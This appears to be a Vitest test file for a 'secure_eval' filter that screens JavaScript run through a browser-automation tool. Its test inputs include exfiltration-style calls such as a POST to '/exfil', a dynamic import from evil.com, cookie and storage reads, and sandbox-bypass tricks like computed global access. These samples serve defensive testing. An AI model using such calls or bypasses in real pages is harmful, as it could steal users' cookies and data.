import { describe, it, expect, vi, beforeEach } from 'vitest';
import { analyzeCode, wrapWithPageProxy } from '../src/experimental/secure-eval';
import { experimentRegistry } from '../src/experimental/index';
import { BrowserBridge } from '../src/tools';

// Mock the logger
vi.mock('../src/logger', () => ({
  getLogger: () => ({
    log: vi.fn(),
    enable: vi.fn(),
    disable: vi.fn(),
  }),
  createLog: () => (..._args: unknown[]) => {},
}));

// ── Unit tests: analyzeCode ──────────────────────────────────

describe('analyzeCode', () => {
  // ── Safe code ──

  describe('safe code', () => {
    it('allows basic expressions', () => {
      expect(analyzeCode('1 + 1')).toEqual({ safe: true });
    });

    it('allows DOM queries', () => {
      expect(analyzeCode("document.querySelector('.foo')")).toEqual({ safe: true });
    });

    it('allows JSON.stringify', () => {
      expect(analyzeCode('JSON.stringify({a:1})')).toEqual({ safe: true });
    });

    it('allows direct window property access (non-computed)', () => {
      expect(analyzeCode('window.location.href')).toEqual({ safe: true });
    });

    it('allows setTimeout with function arg', () => {
      expect(analyzeCode('setTimeout(() => {}, 100)')).toEqual({ safe: true });
    });

    it('allows DOM manipulation', () => {
      expect(analyzeCode("document.getElementById('test').textContent = 'hi'")).toEqual({ safe: true });
    });

    it('allows element property reads', () => {
      expect(analyzeCode("document.querySelector('h1').innerText")).toEqual({ safe: true });
    });

    it('allows complex safe expressions', () => {
      const code = `
        (() => {
          const el = document.querySelector('#player');
          const title = document.querySelector('h1')?.textContent;
          const views = document.querySelector('.view-count')?.textContent;
          return { title, views, hasPlayer: !!el };
        })()
      `;
      expect(analyzeCode(code)).toEqual({ safe: true });
    });

    it('allows fetch as a variable name (not called)', () => {
      expect(analyzeCode('const fetch = 42; console.log(fetch)')).toEqual({ safe: true });
    });

    it('allows Math methods', () => {
      expect(analyzeCode('Math.random()')).toEqual({ safe: true });
    });

    it('allows array operations', () => {
      expect(analyzeCode('[1,2,3].map(x => x * 2)')).toEqual({ safe: true });
    });
  });

  // ── Blocked: API calls ──

  describe('blocked API calls', () => {
    it('blocks fetch()', () => {
      const result = analyzeCode("fetch('/api')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks eval()', () => {
      const result = analyzeCode("eval('code')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks atob()', () => {
      const result = analyzeCode("atob('dGVzdA==')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks btoa()', () => {
      const result = analyzeCode("btoa('test')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks window.fetch()', () => {
      const result = analyzeCode("window.fetch('/api')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks globalThis.eval()', () => {
      const result = analyzeCode("globalThis.eval('code')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks self.fetch()', () => {
      const result = analyzeCode("self.fetch('/exfil', {method:'POST'})");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks window.atob()', () => {
      const result = analyzeCode("window.atob('dGVzdA==')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });
  });

  // ── Blocked: obfuscation ──

  describe('blocked obfuscation primitives', () => {
    it('blocks String.fromCharCode', () => {
      const result = analyzeCode('String.fromCharCode(102,101,116,99,104)');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('obfuscation');
    });

    it('blocks String.raw', () => {
      const result = analyzeCode('String.raw`test`');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('obfuscation');
    });
  });

  // ── Blocked: timer string execution ──

  describe('blocked timer string execution', () => {
    it('blocks setTimeout with string arg', () => {
      const result = analyzeCode("setTimeout('alert(1)', 100)");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('setTimeout');
    });

    it('blocks setInterval with string arg', () => {
      const result = analyzeCode("setInterval('doStuff()', 1000)");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('setInterval');
    });
  });

  // ── Blocked: reflection ──

  describe('blocked reflection', () => {
    it('blocks Reflect.get', () => {
      const result = analyzeCode("Reflect.get(window, 'fetch')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Reflect');
    });

    it('blocks Reflect.apply', () => {
      const result = analyzeCode('Reflect.apply(fetch, null, [])');
      expect(result.safe).toBe(false);
      // Reflect.apply contains a fetch() call too, but either reason is valid
      expect(result.safe).toBe(false);
    });
  });

  // ── Blocked: network beacon ──

  describe('blocked network beacon', () => {
    it('blocks navigator.sendBeacon', () => {
      const result = analyzeCode("navigator.sendBeacon('/track', data)");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('sendBeacon');
    });
  });

  // ── Blocked: storage access ──

  describe('blocked storage access', () => {
    it('blocks localStorage.getItem', () => {
      const result = analyzeCode("localStorage.getItem('key')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('storage');
    });

    it('blocks sessionStorage.setItem', () => {
      const result = analyzeCode("sessionStorage.setItem('k','v')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('storage');
    });
  });

  // ── Blocked: cookie access ──

  describe('blocked cookie access', () => {
    it('blocks document.cookie read', () => {
      const result = analyzeCode('document.cookie');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('cookie');
    });

    it('blocks document.cookie assignment', () => {
      const result = analyzeCode("document.cookie = 'session=abc123'");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('cookie');
    });
  });

  // ── Blocked: dynamic global access ──

  describe('blocked dynamic global access', () => {
    it('blocks window[expr]', () => {
      const result = analyzeCode("window['fe' + 'tch']('/api')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Computed property');
    });

    it('blocks globalThis[expr]', () => {
      const result = analyzeCode("globalThis[name]");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Computed property');
    });

    it('blocks self[expr]', () => {
      const result = analyzeCode("self[prop]");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Computed property');
    });
  });

  // ── Blocked: prototype walking ──

  describe('blocked prototype walking', () => {
    it('blocks __proto__', () => {
      const result = analyzeCode('({}).__proto__');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Prototype');
    });

    it('blocks constructor chaining', () => {
      const result = analyzeCode("('').constructor");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Prototype');
    });
  });

  // ── Blocked: dangerous constructors ──

  describe('blocked dangerous constructors', () => {
    it('blocks new Function()', () => {
      const result = analyzeCode("new Function('return 1')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('constructor');
    });

    it('blocks new WebSocket()', () => {
      const result = analyzeCode("new WebSocket('ws://example.com')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('constructor');
    });

    it('blocks new XMLHttpRequest()', () => {
      const result = analyzeCode('new XMLHttpRequest()');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('constructor');
    });

    it('blocks new EventSource()', () => {
      const result = analyzeCode("new EventSource('/stream')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('constructor');
    });
  });

  // ── Blocked: import expressions ──

  describe('blocked import expressions', () => {
    it('blocks dynamic import()', () => {
      const result = analyzeCode("import('https://evil.com/module.js')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('import');
    });
  });

  // ── Blocked: v2 AST rules ──

  describe('v2: comma operator bypass', () => {
    it('blocks (0, fetch)()', () => {
      const result = analyzeCode("(0, fetch)('/api')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Comma operator');
    });

    it('blocks (0, eval)()', () => {
      const result = analyzeCode("(0, eval)('code')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Comma operator');
    });

    it('allows comma operator with safe functions', () => {
      expect(analyzeCode("(0, console.log)('hi')")).toEqual({ safe: true });
    });
  });

  describe('v2: Function() call without new', () => {
    it('blocks Function() as call', () => {
      const result = analyzeCode("Function('return 1')()");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });
  });

  describe('v2: missing globals (top, frames, parent)', () => {
    it('blocks top.fetch()', () => {
      const result = analyzeCode("top.fetch('/api')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });

    it('blocks frames[expr]', () => {
      const result = analyzeCode("frames['fe' + 'tch']");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Computed property');
    });

    it('blocks parent.eval()', () => {
      const result = analyzeCode("parent.eval('code')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('blocked API');
    });
  });

  describe('v2: this-as-global', () => {
    it('blocks this.fetch()', () => {
      const result = analyzeCode("this.fetch('/api')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('this');
    });

    it('blocks this.eval()', () => {
      const result = analyzeCode("this.eval('code')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('this');
    });

    it('allows this.querySelector()', () => {
      expect(analyzeCode("this.querySelector('h1')")).toEqual({ safe: true });
    });
  });

  describe('v2: bracket cookie access', () => {
    it("blocks document['cookie']", () => {
      const result = analyzeCode("document['cookie']");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('cookie');
    });

    it('still blocks document.cookie', () => {
      const result = analyzeCode('document.cookie');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('cookie');
    });
  });

  describe('v2: document.defaultView', () => {
    it('blocks document.defaultView', () => {
      const result = analyzeCode('document.defaultView');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('defaultView');
    });

    it('blocks document.defaultView.fetch()', () => {
      const result = analyzeCode("document.defaultView.fetch('/api')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('defaultView');
    });
  });

  describe('v2: Object.getOwnPropertyDescriptor', () => {
    it('blocks Object.getOwnPropertyDescriptor()', () => {
      const result = analyzeCode("Object.getOwnPropertyDescriptor(window, 'fetch')");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('getOwnPropertyDescriptor');
    });
  });

  describe('v2: blocked API references on globals', () => {
    it('blocks const f = window.fetch', () => {
      const result = analyzeCode('const f = window.fetch');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Blocked API reference');
    });

    it('blocks const e = globalThis.eval', () => {
      const result = analyzeCode('const e = globalThis.eval');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Blocked API reference');
    });

    it('blocks top.Function reference', () => {
      const result = analyzeCode('const F = top.Function');
      expect(result.safe).toBe(false);
      expect(result.reason).toContain('Blocked API reference');
    });

    it('allows window.location (not a blocked API)', () => {
      expect(analyzeCode('const loc = window.location')).toEqual({ safe: true });
    });
  });

  // ── Edge cases ──

  describe('edge cases', () => {
    it('returns safe for empty string', () => {
      expect(analyzeCode('')).toEqual({ safe: true });
    });

    it('returns safe for whitespace only', () => {
      expect(analyzeCode('   \n\t  ')).toEqual({ safe: true });
    });

    it('returns safe for syntax errors (pass through to Runtime.evaluate)', () => {
      expect(analyzeCode('function {')).toEqual({ safe: true });
    });

    it('returns safe for fetch as variable name (not called)', () => {
      expect(analyzeCode('const fetch = 42')).toEqual({ safe: true });
    });
  });
});

// ── Integration tests: experiment gate in onEvaluate ─────────

function createMockExt() {
  return {
    sendCmd: vi.fn().mockResolvedValue('ok'),
    connected: true,
    browser: 'chrome',
    buildTime: null,
    onReconnect: null,
    onTabInfoUpdate: null,
    start: vi.fn(),
    stop: vi.fn(),
    notifyClientId: vi.fn(),
  } as any;
}

function createMockConnectionManager() {
  return {
    setAttachedTab: vi.fn(),
    setConnectedBrowserName: vi.fn(),
    setStealthMode: vi.fn(),
    clearAttachedTab: vi.fn(),
    statusHeader: vi.fn().mockReturnValue(''),
    attachedTab: null,
  } as any;
}

describe('browser_evaluate with secure_eval experiment', () => {
  let bridge: BrowserBridge;
  let mockExt: ReturnType<typeof createMockExt>;
  let mockCM: ReturnType<typeof createMockConnectionManager>;

  beforeEach(() => {
    vi.clearAllMocks();
    experimentRegistry.reset();
    mockExt = createMockExt();
    mockCM = createMockConnectionManager();
    bridge = new BrowserBridge({}, mockExt);
    bridge.initialize({}, {}, mockCM);
  });

  it('allows code through when experiment is disabled', async () => {
    const result = await bridge.callTool('browser_evaluate', {
      expression: "fetch('/api')",
    });
    expect(mockExt.sendCmd).toHaveBeenCalledWith('evaluate', expect.anything());
    expect(result.isError).toBeUndefined();
  });

  it('blocks dangerous code when experiment is enabled', async () => {
    experimentRegistry.enable('secure_eval');
    const result = await bridge.callTool('browser_evaluate', {
      expression: "fetch('/api')",
    });
    expect(mockExt.sendCmd).not.toHaveBeenCalled();
    expect(result.isError).toBe(true);
    expect(result.content[0].text).toContain('secure_eval');
    expect(result.content[0].text).toContain('blocked API');
  });

  it('allows safe code when experiment is enabled', async () => {
    experimentRegistry.enable('secure_eval');
    const result = await bridge.callTool('browser_evaluate', {
      expression: "document.querySelector('h1').textContent",
    });
    expect(mockExt.sendCmd).toHaveBeenCalledWith('evaluate', expect.anything());
    expect(result.isError).toBeUndefined();
  });

  it('blocks via function arg too', async () => {
    experimentRegistry.enable('secure_eval');
    const result = await bridge.callTool('browser_evaluate', {
      function: "fetch('/api')",
    });
    expect(mockExt.sendCmd).not.toHaveBeenCalled();
    expect(result.isError).toBe(true);
  });

  it('returns rawResult error format when blocked', async () => {
    experimentRegistry.enable('secure_eval');
    const result = await bridge.callTool(
      'browser_evaluate',
      { expression: "fetch('/api')" },
      { rawResult: true }
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain('secure_eval');
  });
});

// ── wrapWithPageProxy unit tests ─────────────────────────────

describe('wrapWithPageProxy', () => {
  it('returns a string containing with statement', () => {
    const wrapped = wrapWithPageProxy('1 + 1');
    expect(wrapped).toContain('with(__proxy)');
  });

  it('contains strict mode inner IIFE', () => {
    const wrapped = wrapWithPageProxy('1 + 1');
    expect(wrapped).toContain('"use strict"');
  });

  it('embeds the user code', () => {
    const code = "document.querySelector('h1').textContent";
    const wrapped = wrapWithPageProxy(code);
    expect(wrapped).toContain(code);
  });

  it('is a self-contained IIFE', () => {
    const wrapped = wrapWithPageProxy('42');
    expect(wrapped.trim().startsWith('(function()')).toBe(true);
    expect(wrapped.trim().endsWith(')()')).toBe(true);
  });

  it('includes blocked API set', () => {
    const wrapped = wrapWithPageProxy('1');
    expect(wrapped).toContain('fetch');
    expect(wrapped).toContain('eval');
    expect(wrapped).toContain('WebSocket');
  });

  it('includes Proxy with get trap', () => {
    const wrapped = wrapWithPageProxy('1');
    expect(wrapped).toContain('new Proxy(window');
    expect(wrapped).toContain('[secure_eval] Blocked:');
  });
});

// ── Three-layer integration tests ────────────────────────────

describe('three-layer secure_eval flow', () => {
  let bridge: BrowserBridge;
  let mockExt: ReturnType<typeof createMockExt>;
  let mockCM: ReturnType<typeof createMockConnectionManager>;

  beforeEach(() => {
    vi.clearAllMocks();
    experimentRegistry.reset();
    mockExt = createMockExt();
    mockCM = createMockConnectionManager();
    bridge = new BrowserBridge({}, mockExt);
    bridge.initialize({}, {}, mockCM);
  });

  it('Layer 1 stops before Layer 2 for known dangerous code', async () => {
    experimentRegistry.enable('secure_eval');
    await bridge.callTool('browser_evaluate', { expression: "fetch('/api')" });
    // Layer 1 blocks — sendCmd never called
    expect(mockExt.sendCmd).not.toHaveBeenCalled();
  });

  it('Layer 2 blocks code that passes Layer 1', async () => {
    experimentRegistry.enable('secure_eval');
    // Mock validateEval to return unsafe
    mockExt.sendCmd.mockImplementation(async (cmd: string) => {
      if (cmd === 'validateEval') {
        return { safe: false, reason: '[secure_eval:membrane] Blocked: fetch' };
      }
      return 'ok';
    });

    const result = await bridge.callTool('browser_evaluate', {
      // This code passes AST (Layer 1 doesn't detect the pattern)
      expression: "document.querySelector('h1').textContent",
    });

    // validateEval was called
    expect(mockExt.sendCmd).toHaveBeenCalledWith('validateEval', expect.objectContaining({ code: expect.any(String) }));
    // But result says blocked by membrane
    expect(result.isError).toBe(true);
    expect(result.content[0].text).toContain('membrane');
  });

  it('Layer 3 sends prewrapped: true to evaluate', async () => {
    experimentRegistry.enable('secure_eval');
    // Mock validateEval as safe, evaluate returns normally
    mockExt.sendCmd.mockImplementation(async (cmd: string) => {
      if (cmd === 'validateEval') return { safe: true };
      return 'result';
    });

    await bridge.callTool('browser_evaluate', {
      expression: "document.querySelector('h1').textContent",
    });

    // evaluate should be called with prewrapped: true
    expect(mockExt.sendCmd).toHaveBeenCalledWith('evaluate', expect.objectContaining({
      prewrapped: true,
    }));
  });

  it('Layer 3 catches page proxy errors', async () => {
    experimentRegistry.enable('secure_eval');
    // Mock validateEval as safe, evaluate throws with [secure_eval] prefix
    mockExt.sendCmd.mockImplementation(async (cmd: string) => {
      if (cmd === 'validateEval') return { safe: true };
      if (cmd === 'evaluate') throw new Error('[secure_eval] Blocked: fetch');
      return 'ok';
    });

    const result = await bridge.callTool('browser_evaluate', {
      expression: "document.querySelector('h1').textContent",
    });

    expect(result.isError).toBe(true);
    expect(result.content[0].text).toContain('page proxy');
    expect(result.content[0].text).toContain('[secure_eval]');
  });

  it('non-secure_eval errors bubble up normally', async () => {
    experimentRegistry.enable('secure_eval');
    mockExt.sendCmd.mockImplementation(async (cmd: string) => {
      if (cmd === 'validateEval') return { safe: true };
      if (cmd === 'evaluate') throw new Error('ReferenceError: x is not defined');
      return 'ok';
    });

    const result = await bridge.callTool('browser_evaluate', {
      expression: 'x.toString()',
    });

    // Should be a normal error, not a secure_eval block
    expect(result.isError).toBe(true);
    expect(result.content[0].text).not.toContain('secure_eval');
    expect(result.content[0].text).toContain('ReferenceError');
  });

  it('gracefully handles extension without validateEval support', async () => {
    experimentRegistry.enable('secure_eval');
    // Mock validateEval to throw (extension doesn't support it)
    mockExt.sendCmd.mockImplementation(async (cmd: string) => {
      if (cmd === 'validateEval') throw new Error('Unknown command: validateEval');
      return 'result value';
    });

    const result = await bridge.callTool('browser_evaluate', {
      expression: "document.querySelector('h1').textContent",
    });

    // Should still work — Layer 2 failure is caught, Layer 3 proceeds
    expect(result.isError).toBeUndefined();
    expect(mockExt.sendCmd).toHaveBeenCalledWith('evaluate', expect.anything());
  });

  it('passes through without wrapping when experiment is disabled', async () => {
    const result = await bridge.callTool('browser_evaluate', {
      expression: "fetch('/api')",
    });

    // Should call evaluate directly without prewrapped
    expect(mockExt.sendCmd).toHaveBeenCalledWith('evaluate', expect.objectContaining({
      expression: "fetch('/api')",
    }));
    expect(mockExt.sendCmd).not.toHaveBeenCalledWith('validateEval', expect.anything());
    expect(result.isError).toBeUndefined();
  });
});
